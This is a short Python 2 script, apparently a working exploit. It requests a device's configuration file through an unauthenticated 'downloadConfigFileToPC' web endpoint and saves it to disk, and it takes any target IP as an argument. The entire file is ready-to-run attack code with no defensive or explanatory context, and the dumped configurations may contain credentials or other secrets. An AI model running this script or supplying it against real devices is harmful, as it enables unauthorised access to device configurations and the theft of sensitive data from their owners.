#!/usr/bin/python2
# coding: utf-8
import requests
import sys
import re

def log_config(ip, config):
    logfile = "out/%s-config.ppc" %(ip)
    f = open(logfile, "wb")
    f.write(config)
    f.close()

def dump_config(target):
    ip = re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', target).group()
    print "{+} Dumping config from %s" %(ip)
    url = "%s/html/json.html?method:downloadConfigFileToPC&name=config" %(target)
    try:
        r = requests.get(url, verify=False)
    except:
        sys.exit("{-} Dump failed...")
    if "Config" in r.text:
        log_config(ip=ip, config=r.text)    
        print "{+} Dumped config to out/%s-config.ppc" %(ip)
    else:
        sys.exit("{-} Dump failed...")

def main(args):
    if len(args) != 2:
        sys.exit("use: %s http://1.1.1.1:80" %(args[0]))
    dump_config(target=args[1])

if __name__ == "__main__":
    main(args=sys.argv)
